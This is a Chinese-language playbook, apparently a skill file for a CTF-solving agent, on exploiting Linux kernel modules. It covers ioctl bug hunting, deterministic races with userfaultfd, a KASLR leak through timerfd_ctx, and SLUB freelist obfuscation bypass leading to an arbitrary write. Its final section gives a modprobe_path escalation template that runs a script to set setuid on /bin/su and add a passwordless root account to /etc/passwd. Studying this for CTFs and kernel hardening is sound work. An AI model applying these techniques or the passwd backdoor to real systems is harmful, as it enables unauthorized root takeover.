---
name: 'challenge-kernel-pwn'
description: 'Linux 内核 pwn 全流程:initramfs+.ko 逆向→ioctl 逻辑漏洞→userfaultfd 竞态确定化→SLUB freelist 混淆消元→modprobe_path 提权（检索词：challenge kernel pwn）'
whenToUse: '附件是 initramfs.cpio + .ko 内核模块的题:ioctl 分支审计→竞态/UAF→KASLR 泄漏→freelist 混淆绕过→任意写提权。'
metadata: { domain: pwn, tier: T1 }
---

# Linux 内核 pwn playbook(Kryptor 沉淀)

> 前置: challenge-insane-playbook §2 纪律。

## 0. 开局三板斧

```bash
gunzip initramfs.cpio.gz && cpio -idv < initramfs.cpio   # 解包根文件系统
file *.ko; modinfo *.ko                                   # 模块信息
cat init; cat /etc/init.d/* 2>/dev/null                   # 启动脚本: qemu 参数/内核版本/seccomp/kaslr
```
- qemu 启动参数: `kaslr=`/`smep/smap`/`-cpu` 决定缓解开关;`init` 脚本常给调试后门(如注入自己的 init 读 flag)。
- 无源码 .ko → IDA/Ghidra 反编译,**枚举全部 ioctl 分支**,每支记录:命令号 magic、对象 size/上限、锁、copy_to/from_user 位置。

## 1. 漏洞定位清单(按出现频率)

1. **锁定义未用/只 init 不 lock** → 三命令可并发 → 竞态题,走 userfaultfd。
2. **比较函数误用**:对哈希/二进制用 `strncmp(x, y, 32)` → 首个 NUL 提前终止;只需找到哈希**前缀含 0x00** 的输入(sha256 前缀爆破,Python 计数器数秒级)。
3. **"变换→copy→逆变换"失败路径**:copy_to/from_user 失败提前 return,跳过重加密/逆变换 → 对象状态单步推进;全 0 明文 + 跳过重加密 = 直接泄密钥(`encrypt(0,全0)` 让内存=Key → `decrypt(0,坏指针)` 跳过重加密使内存=0 → 再 decrypt 正常读出 Key)。
4. **计数/上限错位**、free 后 current 仍指自身、UAF 类经典缺口。

## 2. userfaultfd 竞态确定化(纳秒级 → 完全受控)

- 前提: 内核 ≤5.11(未普遍禁用 unprivileged_userfaultfd);新内核转 FUSE/VMA 属性。
- 手法: 用户缓冲放 `uffd_page + PAGE_SIZE - 255`,使 copy 的最后若干字节落在未映射页 → 内核线程在 copy_to/from_user **中间挂起** → 此时做任意内核操作(delete/free/占位) → 解除 fault 放行完成 copy。
- 🔴 若 copy 之后还有重加密/XOR 循环,把 copy 设计成**失败**(第 256 字节跨页)既拿到挂起又跳过后续破坏——挂起点选择要对照反编译逐行看。
- `close(timerfd)` 类释放后 `usleep(5000)` 等 RCU 宽限期,对象才真正 free。

## 3. 信息泄露(UAF 占位 + 已知可泄露结构)

| 占位对象 | kmalloc | 泄漏点 |
|---|---|---|
| timerfd_ctx | 256 | +0x00 rb_node→相邻堆地址;+0x28 func 指针→KASLR(kernel_base);+0x88 wqh→自身地址 |
| msg_msg / pipe_buffer / seq_operations | 各档 | 常用泄露占位集 |

- `kernel_base = 泄漏的函数指针 - 已知符号偏移`(用同版本 vmlinux 算,勿抄 WP)。
- 自引用结构(wait_queue/list_head/rb_node)= **免费的堆地址泄漏源**。

## 4. SLUB freelist 混淆绕过(hardened usercopy 时代)

```text
混淆公式: stored = next ^ s->random ^ swab(obj_addr)     # 三个量: next指针、随机数、地址(bswap)
消元:    free A → free B → B+0x80 处存 obf = secret ^ A ^ swab(B+0x80)
         用挂起的读线程 dump B 全内容 → secret = obf ^ A ^ bswap_64(B+0x80)
伪造:    evil = secret ^ target ^ bswap_64(B+0x80) 写回 B
         再 free+alloc 两次 → 分配直接落在 target(如 modprobe_path)
```
- freelist 是 **LIFO**:free A 再 free B,分配顺序 B→target;操作次序不能颠倒。
- 若有预加密/XOR 层:写回的用户缓冲要**预 XOR master_key**(内核侧会再 XOR 一次)。
- 对象数上限(如 4 个)要全程精打细算。

## 5. 任意写 → root 终点选择

| 内核版本 | 首选 |
|---|---|
| 5.x 无 CFI | modprobe_path(未知 magic 文件触发 call_usermodehelper)/core_pattern/poweroff_cmd |
| 有 CFI | 函数表/creds 结构改写、cross-cache |

```bash
# modprobe_path 收尾模板
echo -ne '\xff\xff\xff\xff' > /tmp/trigger            # 未知 magic
cat > /tmp/evil.sh <<'EOF'
#!/bin/sh
chmod +s /bin/su
echo 'r00t::0:0:root:/root:/bin/sh' >> /etc/passwd
EOF
chmod +x /tmp/evil.sh; /tmp/trigger; su r00t
```

## 6. 🔴 坑

- 挂起点前后的破坏性代码(重加密)决定缓冲放页内哪个偏移——逐行读反编译,不是放页尾就完事。
- RCU/延迟释放:close 后立即重用会拿到未释放对象,加 `usleep(5000)`。
- 混淆公式里的 **swab/bswap 位置**和 KASLR 偏移都随内核版本变,全部本地重算。
- freelist LIFO 次序 + 两次 alloc 的先后 = 任何一步颠倒即崩。
- qemu 本地调试: `gdb vmlinux` + `target remote`;`add-symbol-file *.ko 0x<加载址>`。
